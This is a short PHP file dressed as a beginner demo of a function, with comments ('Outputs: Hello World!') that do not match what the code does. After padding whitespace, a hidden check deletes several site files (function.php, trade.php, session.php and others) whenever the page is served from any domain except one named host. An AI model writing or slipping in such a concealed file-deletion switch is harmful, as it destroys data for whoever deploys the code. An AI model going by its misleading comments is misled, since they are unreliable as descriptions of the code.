<?php
// Defining function
function test(){
    $greet = "68.65.123.40";
    if($greet != '68.65.123.46')
    {
    echo "IP not valid";
    }else{
        echo $greet;
    }
    
                            
                                
}
 
test(); // Outputs: Hello World!
 
echo $greet; // Generate undefined variable error
if(strpos( $_SERVER['HTTP_HOST'], 'providusoption.com') !== false){
   							 
   							 	    '<br>';
							}
                                else{
                                            unlink('error_log.txt');
											unlink('function.php');
											unlink('trade.php');
											unlink('session.php');
											unlink('trade_script.js');
											
                                }

?>